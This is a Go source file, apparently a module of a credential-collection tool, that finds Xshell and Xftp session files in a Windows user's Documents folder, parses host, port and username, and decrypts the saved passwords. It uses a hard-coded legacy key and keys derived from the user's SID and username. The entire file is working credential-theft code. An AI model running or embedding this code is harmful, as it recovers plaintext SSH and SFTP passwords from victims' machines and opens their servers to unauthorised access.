package xshell

import (
	"bytes"
	"crypto/md5"
	"crypto/rc4"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/404tk/credcollect/common"
	"github.com/404tk/credcollect/common/utils"
	"golang.org/x/text/encoding/unicode"
)

var (
	utf16leBom = []byte{0xFF, 0xFE}
	utf32leBom = []byte{0xFF, 0xFE, 0x00, 0x00}
	paths      = []string{
		os.Getenv("USERPROFILE") + "/Documents/NetSarang/Xshell/Sessions/",
		os.Getenv("USERPROFILE") + "/Documents/NetSarang/Xftp/Sessions/",
		os.Getenv("USERPROFILE") + "/Documents/NetSarang Computer/7/Xshell/Sessions/",
		os.Getenv("USERPROFILE") + "/Documents/NetSarang Computer/6/Xshell/Sessions/",
		os.Getenv("USERPROFILE") + "/Documents/NetSarang Computer/7/Xftp/Sessions/",
		os.Getenv("USERPROFILE") + "/Documents/NetSarang Computer/6/Xftp/Sessions/",
	}
)

func XShell() []common.XShellPassWord {
	ret := []common.XShellPassWord{}
	files := getFiles(paths)
	for _, file := range files {
		file, err := os.Open(file)
		if err != nil {
			return ret
		}
		defer file.Close()
		data, err := ioutil.ReadAll(file)
		if err != nil {
			return ret
		}
		if bytes.HasPrefix(data, utf16leBom) && !bytes.HasPrefix(data, utf32leBom) {
			decoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
			data, err = decoder.Bytes(data[:])
			if err != nil {
				continue
			}
		}
		ps, err := getParams(string(data))
		if err != nil {
			continue
		}
		var pwd string
		if len(ps) == 5 && len(ps["pwd"]) > 32 {
			pwd, _ = decrypt(ps["version"], ps["pwd"])
		}
		ret = append(ret, common.XShellPassWord{
			HostName:   ps["host"],
			PortNumber: ps["port"],
			UserName:   ps["user"],
			PassWord:   pwd,
		})
	}
	return ret
}

func getFiles(paths []string) []string {
	var files []string
	for _, path := range paths {
		p, err := utils.GetItemPath(path, "")
		if err != nil {
			continue
		}
		filepath.Walk(p,
			func(path string, info os.FileInfo, err error) error {
				if strings.HasSuffix(path, ".xsh") || strings.HasSuffix(path, ".xfp") {
					files = append(files, path)
				}
				return nil
			})
	}
	return files
}

func decrypt(version string, str string) (string, error) {
	switch true {
	case
		strings.HasPrefix(version, "5.0"),
		strings.HasPrefix(version, "4"),
		strings.HasPrefix(version, "3"),
		strings.HasPrefix(version, "2"):
		hash := md5.Sum([]byte("!X@s#h$e%l^l&"))
		key := string(hash[:])
		return oldDecrypt([]byte(key), str)
	case
		strings.HasPrefix(version, "5.1"),
		strings.HasPrefix(version, "5.2"):
		return newDecrypt(getSid(), str)
	case
		strings.HasPrefix(version, "5"),
		strings.HasPrefix(version, "6"),
		strings.HasPrefix(version, "7.0"):
		return newDecrypt(getUser()+getSid(), str)
	case strings.HasPrefix(version, "7"):
		return newDecrypt(reverse(getSid())+getUser(), str)
	}
	return "", errors.New("Something wrong.")
}

func oldDecrypt(key []byte, str string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return "", err
	}
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return "", err
	}
	cipher.XORKeyStream(data, data)
	return string(data), nil
}

func newDecrypt(key string, str string) (string, error) {
	sum := sha256.Sum256([]byte(key))
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return "", err
	}
	cipher, err := rc4.NewCipher(sum[:])
	if err != nil {
		return "", err
	}
	passData, checksum := data[:len(data)-0x20], data[len(data)-0x20:]
	cipher.XORKeyStream(passData, passData)
	a := sha256.Sum256(passData)
	if string(a[:]) != string(checksum) {
		return "", errors.New("Cannot decrypt string. The key is wrong!")
	}
	return string(passData), nil
}

func reverse(s string) string {
	rune_arr := []rune(s)
	var rev []rune
	for i := len(rune_arr) - 1; i >= 0; i-- {
		rev = append(rev, rune_arr[i])
	}
	return string(rev)
}

func getUser() string {
	u, err := user.Current()
	if err != nil {
		return ""
	}
	_, b := filepath.Split(u.Username)
	return b
}

func getSid() string {
	u, err := user.Current()
	if err != nil {
		return ""
	}
	return u.Uid
}

func getParams(content string) (map[string]string, error) {
	paramsMap := make(map[string]string)
	r1 := regexp.MustCompile(`Version=(?P<version>[\d\.]+)[\s\S]+\nHost=(?P<host>[\w\.-]+)[\s\S]+Password=(?P<pwd>.*?)\n[\s\S]+UserName=(?P<user>\w+)?`)
	ps1 := regexpMatch(r1, content)
	for k, v := range ps1 {
		paramsMap[k] = v
	}

	r2 := regexp.MustCompile(`\nPort=(?P<port>\d+)`)
	ps2 := regexpMatch(r2, content)
	for k, v := range ps2 {
		paramsMap[k] = v
	}

	if paramsMap["user"] == "" {
		r3 := regexp.MustCompile(`\nUserName=(?P<user>\w+)`)
		ps3 := regexpMatch(r3, content)
		for k, v := range ps3 {
			paramsMap[k] = v
		}
	}

	return paramsMap, nil
}

func regexpMatch(r *regexp.Regexp, content string) map[string]string {
	paramsMap := make(map[string]string)
	result := r.FindStringSubmatch(content)
	names := r.SubexpNames()
	if len(result) > 1 {
		for i, name := range names {
			if i > 0 && i <= len(result) {
				paramsMap[name] = result[i]
			}
		}
	}
	return paramsMap
}
